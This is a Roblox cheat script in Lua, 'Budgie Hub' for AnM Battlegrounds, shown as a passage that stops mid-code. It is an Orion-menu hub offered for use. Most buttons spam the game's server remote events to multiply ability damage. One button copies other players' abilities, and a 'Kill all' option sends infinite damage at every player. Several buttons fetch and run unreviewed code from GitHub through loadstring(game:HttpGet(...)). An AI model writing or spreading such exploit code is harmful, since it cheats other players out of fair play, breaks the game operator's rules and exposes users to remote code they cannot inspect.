local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Mobile%20Friendly%20Orion')))()

local Window = OrionLib:MakeWindow({Name = "Budgie Hub | AnM battlegrounds", HidePremium = true, IntroEnabled = false, SaveConfig = false, ConfigFolder = "OrionTest", IntroText = "Budgie Hub", IntroIcon = "rbxassetid://16336200609"})

local Tab = Window:MakeTab({
	Name = "Characters",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
 Name = "Oneshot Bug",
    Callback = function()
        local tool = Instance.new("Tool")
tool.Name = "Oneshot Bug"
tool.RequiresHandle = false

tool.Activated:Connect(function()
game:GetService("ReplicatedStorage").sukuna.remotes.rush:FireServer()
wait(2)
game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0
end)

tool.Parent = game.Players.LocalPlayer.Backpack

   end    
})

local Section = Tab:AddSection({
	Name = "Gota"
})

Tab:AddLabel("Press all buttons below to activate Gota")
Tab:AddLabel("And press the buttons in order, it's important!")

Tab:AddButton({
 Name = "Select Yuta Okkotsu",
    Callback = function()
                local args = { "Yuta Okkotsu" }
            game:GetService("ReplicatedStorage").Picked:FireServer(unpack(args))
   end    
})

Tab:AddButton({
 Name = "Use Mimicry",
    Callback = function()
            for i = 1, 30 do
                game:GetService("Players").LocalPlayer.Backpack.Mimicry.Script.Event:FireServer()
            end
   end    
})

Tab:AddButton({
 Name = "Use Gota",
    Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Gojo.Script.Event:FireServer()
   end    
})

Tab:AddLabel("You don't need press buttons below, if you want to select Gota")

Tab:AddButton({
 Name = "Powerful Fury Barrage",
 Callback = function()
        for i = 1, 10 do

game:GetService("Players").LocalPlayer.Backpack["Fury Barrage"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Technique Pull",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Technique Pull"].Blue.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Lapse Blue",
 Callback = function()
        for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack["Lapse Blue"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Reversal Red",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Reversal Red"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Imaginary Technique: Purple",
 Callback = function()
game:GetService("Players").LocalPlayer.Backpack["Imaginary Technique Purple"].murasaki.Event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Hollow Purple",
    Callback = function()
game:GetService("Players").LocalPlayer.Backpack["Hollow Purple"].LocalScript.event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Powerful Reverse Cursed Technique",
    Callback = function()
        for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Reverse Cursed Technique"].Script.Event:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Domain Expansion: Unlimited Void",
    Callback = function()
game:GetService("Players").LocalPlayer.Backpack["Unlimited Void"].Skill.InfinityVoid:FireServer()
   end    
})

local Section = Tab:AddSection({
	Name = "Try it"
})

Tab:AddButton({
 Name = "The Strongest Sukuna",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_True-Sukuna/main/Character"))()
   end    
})

Tab:AddButton({
 Name = "True Kenjaku",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_True-Kenjaku/main/Character"))()
   end    
})

Tab:AddButton({
 Name = "Imitation",
 Callback = function()
        local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
tool.Name = "Imitation"
tool.RequiresHandle = false
tool.ToolTip = "Copies a random ability of a random player | can't run ReplicatedStorage"

local lastPressTime = 0
tool.Activated:Connect(function()
  local currentTime = tick()
            if currentTime - lastPressTime >= 3.5 then
                lastPressTime = currentTime 
       local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://17592658336"
local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
k:Play()
k:AdjustSpeed(1)
wait(3.5)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function getRandomPlayer()
    local players = Players:GetPlayers()
    return players[math.random(1, #players)]
end

local function getRandomTool(player)
    local tools = player.Backpack:GetChildren()
    return tools[math.random(1, #tools)]
end

local function activateRandomAbility()
    local randomPlayer = getRandomPlayer()
    local randomTool = getRandomTool(randomPlayer)

    local remoteEvents = {}
    for _, descendant in ipairs(randomTool:GetDescendants()) do
        if descendant:IsA("RemoteEvent") then
            table.insert(remoteEvents, descendant)
        end
    end

    if #remoteEvents > 0 then
        local randomEvent = remoteEvents[math.random(1, #remoteEvents)]
for i = 1, 3 do
        randomEvent:FireServer()
end
    else
        for _, descendant in ipairs(randomTool:GetDescendants()) do
            if descendant:IsA("RemoteFunction") then
                descendant:InvokeServer()
                break
            elseif descendant:IsA("BindableEvent") then
                descendant:Fire()
                break
            end
        end
    end
end

activateRandomAbility()
            end
end)
   end    
})

Tab:AddButton({
 Name = "Highest Mastery: Mimicry",
 Callback = function()
        local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
tool.Name = "Highest Mastery: Mimicry"
tool.RequiresHandle = false
tool.ToolTip = "Copies a random ability of a random player | can't run ReplicatedStorage"

local lastPressTime = 0
tool.Activated:Connect(function()
    local currentTime = tick()
    if currentTime - lastPressTime >= 3.5 then
        lastPressTime = currentTime
        local Anim = Instance.new("Animation")
        Anim.AnimationId = "rbxassetid://17592658336"
        local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
        k:Play()
        k:AdjustSpeed(1)
        wait(3.5)

        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer

        local function getRandomPlayer()
         if player ~= LocalPlayer then
            local players = Players:GetPlayers()
            return players[math.random(1, #players)]
           end
        end

        local function getRandomTool(player)
                local tools = player.Backpack:GetChildren()
                return tools[math.random(1, #tools)]
        end

        local function activateRandomAbility()
            local randomPlayer = getRandomPlayer()
            local randomTool = getRandomTool(randomPlayer)

            local remoteEvents = {}
            for _, descendant in ipairs(randomTool:GetDescendants()) do
                if descendant:IsA("RemoteEvent") then
                    table.insert(remoteEvents, descendant)
                end
            end

            if #remoteEvents > 0 then
                local randomEvent = remoteEvents[math.random(1, #remoteEvents)]
                local tool = Instance.new("Tool")
                tool.Name = "Copied Technique"
                tool.ToolTip = tostring(randomPlayer) .. ":" .. randomTool.Name
                tool.RequiresHandle = false

                tool.Activated:Connect(function()
                    for i = 1, 5 do
                        randomEvent:FireServer()
                    end
                end)

                tool.Parent = game.Players.LocalPlayer.Backpack
            else
                for _, descendant in ipairs(randomTool:GetDescendants()) do
                    if descendant:IsA("RemoteFunction") then
                        descendant:InvokeServer()
                        break
                    elseif descendant:IsA("BindableEvent") then
                        descendant:Fire()
                        break
                    end
                end
            end
        end

        activateRandomAbility()
    end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MyButtonGuiTest"
ScreenGui.Enabled = true
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local Button = Instance.new("TextButton")
Button.Name = "Button"
Button.Size = UDim2.new(0.07, 0.07, 0.07, 7)
Button.Position = UDim2.new(0.86, 0, 0.4, 0)
Button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.TextScaled = true
Button.Text = "Remove all Techniques"
Button.Parent = ScreenGui

Button.MouseButton1Click:Connect(function()
    for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
     if v.Name == "Copied Technique" then
       v:Destroy()
     end
   end
end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MyButtonGuiTest"
ScreenGui.Enabled = true
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local Button = Instance.new("TextButton")
Button.Name = "Button"
Button.Size = UDim2.new(0.04, 0.04, 0.04, 7)
Button.Position = UDim2.new(0.945, 0, 0.4, 0)
Button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.TextScaled = true
Button.Text = "Activate all Techniques"
Button.Parent = ScreenGui

Button.MouseButton1Click:Connect(function()
    for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
     if v.Name == "Copied Technique" then
       v.Parent = game.Players.LocalPlayer.Character
  game.RunService.Heartbeat:Wait()
 v:Activate()
game.RunService.Heartbeat:Wait()
v.Parent = game.Players.LocalPlayer.Backpack
     end
   end
end
end)
   end    
})

Tab:AddButton({
 Name = "Mahito Hell",
 Callback = function()
        local Players = game:GetService("Players")
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local TeleportInterval = 0.1

                local function teleportToPlayers(player)
                    for _, targetPlayer in pairs(Players:GetPlayers()) do
                        if targetPlayer ~= player then
                            player.Character:MoveTo(targetPlayer.Character.PrimaryPart.Position)
                            ReplicatedStorage.MahitoDomainExpansion.MahitoDomainEvent:FireServer()
                            wait(TeleportInterval)
                        end
                    end
                end

                local localPlayer = Players.LocalPlayer
                teleportToPlayers(localPlayer)
   end    
})

Tab:AddButton({
 Name = "The Honored One",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_The-Honored-One/main/Character"))()
   end    
})

Tab:AddButton({
 Name = "Astaroth",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_Astaroth/main/ScriptSourceCharacter"))()
   end    
})

Tab:AddButton({
 Name = "The Strongest",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/testscript_AnM1/main/Script"))()
   end    
})

local Section = Tab:AddSection({
	Name = "Gojo Young"
})

Tab:AddLabel("Form 1")

Tab:AddButton({
 Name = "Super Red",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack.Red.aka.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Super Pull",
 Callback = function()
        for i = 1, 100 do
game:GetService("Players").LocalPlayer.Backpack["Technique Pull"].ao.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Cursed Technique Red",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Cursed Technique Red"].Skill.Red:FireServer()
end
   end    
})


Tab:AddButton({
 Name = "Powerful Maximum Output Blue",
 Callback = function()
        for i = 1, 5 do
            local ohTable1 = {
    ["Function"] = "Fire",
    ["Name"] = "BlueMo",
    ["rootpos"] = CFrame.new(39.0846443, 19.8230076, -162.294754, -0.0822739899, 3.01816527e-08, 0.996609747, -4.96030914e-08, 1, -3.43792514e-08, -0.996609747, -5.22634416e-08, -0.0822739899)
}

game:GetService("ReplicatedStorage").Server:InvokeServer(ohTable1)
end
   end    
})

Tab:AddButton({
 Name = "Transformation (The Honored One)",
 Callback = function()
game:GetService("Players").LocalPlayer.Backpack["The Honored One"].Script.Event:FireServer()
   end    
})

Tab:AddLabel("Form 2")


Tab:AddButton({
 Name = "Powerful Technique Red",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Technique Red"].Skill.Red:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Imaginary Technique: Purple",
 Callback = function()
game:GetService("Players").LocalPlayer.Backpack["Imaginary Technique Purple"]["Imaginary Purple"].Event:FireServer()
   end    
})


local Section = Tab:AddSection({
	Name = "Gojo"
})

Tab:AddButton({
 Name = "Super Red",
 Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").Remotes.Red:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Technique Pull",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Technique Pull"].ao.Event:FireServer()
   end    
})
Tab:AddButton({
 Name = "Spam Lapse Blue",
 Callback = function()
        for i = 1, 20 do
wait()
game:GetService("Players").LocalPlayer.Backpack["Lapse Blue"].Move1.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "One Six Eyes",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["One Six Eyes"].Script.Event:FireServer()
   end    
})

Tab:AddLabel("Form 2")

Tab:AddButton({
 Name = "Maximum Red",
 Callback = function()
        for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Maximum Reversal Red"].Red.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Ultimate Red",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack.Red.Script.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Maximum Blue",
 Callback = function()
        game:GetService("ReplicatedStorage").Remotes.Blue:FireServer()
   end    
})

Tab:AddButton({
 Name = "Purple",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Purple"):FireServer()
   end    
})

Tab:AddButton({
 Name = "Powerful Rushed",
 Callback = function()
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack.Rushed.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Unlimited Void 0,2",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Unlimited Void 0,2s"].Domain.Event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Six Eyes",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Six Eyes"].Script.Event:FireServer()
   end    
})

Tab:AddLabel("Form 3")

Tab:AddButton({
 Name = "Powerful Black Flash",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Black Flash"].BlackFlash.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Unlimited Void",
 Callback = function()
game:GetService("Players").LocalPlayer.Backpack["Unlimited Void"].Skill.InfinityVoid:FireServer()
   end    
})

Tab:AddButton({
 Name = "200% Purple",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Maximum Hollow Purple"].Skill.Event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Nuke Purple",
 Callback = function()
        local ohString1 = "FinalHollowPurple"

game:GetService("ReplicatedStorage").Events.Abilitys.Gojo:FireServer(ohString1)
   end    
})


local Section = Tab:AddSection({
	Name = "Sukuma"
})

Tab:AddButton({
 Name = "Powerful Cursed Barrage",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Cursed Barrage"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Black Slash",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Black Flash"].BlackFlash.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Slaughter Demon",
 Callback = function()
        for i = 1, 25 do
game:GetService("Players").LocalPlayer.Backpack["Slaughter Demon"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Kick Manji",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Manji Kick"].Kick.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Boxing Arena",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Boxing Arena"].Skill.RingOfDeath:FireServer()
   end    
})

Tab:AddButton({
 Name = "Activate ult",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("KingofCurses"):FireServer()
   end    
})

Tab:AddLabel("Ult version")

Tab:AddButton({
 Name = "Powerful Cleave",
 Callback = function()
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack.Cleave.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Dismantle",
 Callback = function()
        for i = 1, 50 do
game:GetService("Players").LocalPlayer.Backpack.Dismantle.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Multi Fire",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Assets"):WaitForChild("Remtoes"):WaitForChild("Fire"):FireServer()
   end    
})

Tab:AddButton({
 Name = "Multi regen",
 Callback = function()
 game:GetService("Players").LocalPlayer.Backpack["Reversed Cursed Technique"].Script.Event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Domain",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("MalevolentShrine"):FireServer()
   end    
})

local Section = Tab:AddSection({
	Name = "Toji"
})

Tab:AddButton({
 Name = "Super Punches",
 Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").Remotes.Punches:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful PlayfulCould",
 Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").Remotes.PlayfulCloud:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Incredible Vanishing",
 Callback = function()
        for i = 1, 20 do
game:GetService("ReplicatedStorage").Remotes.Vanishing:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Activate Ult",
 Callback = function()
game:GetService("Players").LocalPlayer.Backpack["Inverted Spear Of Heaven"].Script.Event:FireServer()
   end    
})

Tab:AddLabel("Ult version")

Tab:AddButton({
 Name = "Powerful Flash Strike",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Flash Strike"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Domain Breaker",
 Callback = function()
        for i = 1, 6 do
game:GetService("Players").LocalPlayer.Backpack["Domain Breaker"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Little Hand",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Little Hand"].Combo.Event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
	Name = "Saitama"
})

Tab:AddButton({
 Name = "Fast Powerful Blows",
 Callback = function()
        for i = 1, 10 do
wait()
game:GetService("Players").LocalPlayer.Backpack["Consecutive Normal Punches"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Normal Punch",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Normal Punch"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Mega Shove",
 Callback = function()
        for i = 1, 40 do
game:GetService("Players").LocalPlayer.Backpack.Shove.Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Really Serious Punch",
 Callback = function()
        for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Serious Punch"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton(
    {
        Name = "Omni Directional Punch",
        Callback = function()
            local ohTable1 = {
                ["Function"] = "Fire",
                ["Name"] = "OmniDirectionalPunch",
                ["rootpos"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            }

            game:GetService("ReplicatedStorage").Server:InvokeServer(ohTable1)
        end
    }
)

local Section = Tab:AddSection({
 Name = "Black Goku"
})

Tab:AddButton({
 Name = "Powerful Mortal Extinguisher",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Mortal Extinguisher"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Divine Bursttrough",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Divine Bursttrough"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Barrage",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack.Barrage.Punch.Event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
 Name = "Zenitzu"
})

Tab:AddButton({
 Name = "Server's Scar",
 Callback = function()
        for i = 1, 10 do
task.spawn(function()
game:GetService("Players").LocalPlayer.Backpack["Thunder Clap"].TC.Event:FireServer()
end)
end
   end    
})

local Section = Tab:AddSection({
 Name = "Garou"
})

Tab:AddButton({
 Name = "Powerful Crushed Rock",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Crushed Rock"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Flowing Water",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Flowing Water"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Hunter's Currently",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Hunter's Cruelty"].Ground.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Final Hunt",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["The Final Hunt"].Ground.Event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
 Name = "Rengoku"
})

Tab:AddButton({
 Name = "Powerful Blazing Universe",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Blazing Universe"].Ground.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Rising Scorching Sun",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Rising Scorching Sun"].Ground.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Unknowing Fire",
 Callback = function()
        for i = 1, 25 do
game:GetService("Players").LocalPlayer.Backpack["Unknowing Fire"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "For Real Rengoku",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack.Rengoku.Ground.Event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
	Name = "Luffy"
})

Tab:AddButton({
 Name = "Long Punch",
 Callback = function()
        for i = 1, 25 do
game:GetService("Players").LocalPlayer.Backpack.Pistol.Move.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Double Punch",
 Callback = function()
        
   end    
})

Tab:AddButton({
 Name = "Leg Kick",
 Callback = function()
        for i = 1, 8 do
game:GetService("Players").LocalPlayer.Backpack["Battle Axe"].Move.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Consecutive Strikes",
 Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").barrage.barrage:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Gear 2 Activate",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Gear 2"].Script.Event:FireServer()
   end    
})

Tab:AddLabel("Gear 2 Version")

Tab:AddButton({
 Name = "Powerful Long Punch",
 Callback = function()
        for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack.Jet.Move.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Double Punch",
 Callback = function()
        for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack["Jet Missile"].Move.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Leg Kick",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Battle Axe"].Move.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Consecutive Strikes",
 Callback = function()
        for i = 1, 5 do
game:GetService("ReplicatedStorage").barrage.jetbarrage:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Gear 1 Activate",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Gear 1"].Script.Event:FireServer()
   end    
})

local Section = Tab:AddSection({
	Name = "Hakari"
})

Tab:AddButton({
	Name = "Powerful ball",
	Callback = function()
      		for i = 1, 20 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Pachinko"):FireServer()
end
  	end    
})

Tab:AddButton({
	Name = "To cut in half",
	Callback = function()
      		for i = 1, 15 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ShutterDoors"):FireServer()
end
  	end    
})

Tab:AddButton({
	Name = "Powerful beating",
	Callback = function()
      		for i = 1, 10 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LuckyBeatdown"):FireServer()
end
  	end    
})

Tab:AddButton({
 Name = "Powerful Projectile",
 Callback = function()
        wait(1.5)
for i = 1, 10 do
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local targetPosition = mouse.Hit.Position
local ohCFrame1 = CFrame.new(targetPosition)
local ohVector32 = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z)

game:GetService("ReplicatedStorage").Remotes.PachinkoBall:FireServer(ohCFrame1, ohVector32)
end
   end    
})

Tab:AddDropdown({
	Name = "Domain Expansion",
	Default = "1",
	Options = {"Luck", "Unluck"},
	Callback = function(Value)
	   if Value == "Luck" then
	game:GetService("ReplicatedStorage").Remotes.IdleDeathGamble:FireServer()
	elseif Value == "Unluck" then
	game:GetService("ReplicatedStorage").Remotes.IdleDeathGambleFail:FireServer()
	   end
	end    
})

Tab:AddButton({
	Name = "Spawn containers",
	Callback = function()
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ContainerKick"):FireServer()
	end    
})

local Section = Tab:AddSection({
	Name = "Sakuya"
})

Tab:AddButton({
 Name = "Spam knife throw",
 Callback = function()
        while true do
 wait()
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Knife Throw").Knife.Fire:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Spam knife burst",
 Callback = function()
        while true do
 wait()
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Knives Burst").Knife.Fire:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Spam knife wall",
 Callback = function()
        while true do
  wait(0.2)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Sense of Thrown Edge").Knife.Fire:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful wound sign",
 Callback = function()
        for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack["Wound Sign"].Script.Event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
	Name = "Gyutaro"
})

Tab:AddButton({
 Name = "Powerful Circular Slashes",
 Callback = function()
        for i = 1, 50 do
game:GetService("Players").LocalPlayer.Backpack["Circual Slashes"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Rampant Rampage",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Rampant Rampage"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Projectile",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Rampant Arc"].Keybind.Fire:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Sequential Projectiles",
 Callback = function()
        for i = 1, 100 do
wait()
game:GetService("Players").LocalPlayer.Backpack["Rampant Arc"].Keybind.Fire:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Tool Spam Projectiles",
 Callback = function()
        repeat
  game:GetService("RunService").RenderStepped:Wait()
 if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc") then
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc").Keybind.Fire:FireServer()
  end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Danger Murder",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Rampant Rampage"].Punch.Event:FireServer()
end
wait(0.3)
game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
   end    
})

local Section = Tab:AddSection({
	Name = "Kenjaku(OP Character)"
})

Tab:AddButton({
 Name = "Powerful squid cursed",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Squid Curse").Move1.Event:FireServer()
end
   end    
})

Tab:AddDropdown({
	Name = "Mini uzumaki control",
	Default = "1",
	Options = {"Spam mini uzumaki", "Kill all", "Line of death"},
	Callback = function(Value)
		if Value == "Spam mini uzumaki" then
		local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Mini Uzumaki" then
       v.Parent = LP.Character
   end
end
 
        while true do
 wait(0.2)
local mouse = game:GetService("Players").LocalPlayer:GetMouse()
local clickPosition = mouse.Hit.Position

local args = {
    [1] = CFrame.new(clickPosition),
    [2] = 1000000
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Mini Uzumaki").FireServer.RemoteEvent:FireServer(unpack(args))
end
		elseif Value == "Kill all" then
		local players = game:GetService("Players"):GetPlayers()

for _, player in ipairs(players) do
    if player.Character then
        local args = {
            [1] = player.Character.HumanoidRootPart.CFrame,
            [2] = math.huge
        }

        game:GetService("Players").LocalPlayer.Backpack["Mini Uzumaki"].FireServer.RemoteEvent:FireServer(unpack(args))
    end
end
		elseif Value == "Line of death" then
		local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = char:WaitForChild("HumanoidRootPart")

local playerForward = humanoidRootPart.CFrame.LookVector
local startPos = humanoidRootPart.CFrame * CFrame.new(5 * playerForward)

local numUzumaki = 20
local spacing = 45

for i = 1, numUzumaki do
    local args = {
        [1] = startPos + ((i - 1) * spacing * playerForward),
        [2] = math.huge
    }
    game.Players.LocalPlayer.Backpack["Mini Uzumaki"].FireServer.RemoteEvent:FireServer(unpack(args))
end
		end
	end    
})

Tab:AddButton({
 Name = "Powerful maximum utzumaki",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Maximum Uzumaki").Move1.Event:FireServer()
end
   end    
})

Tab:AddButton({
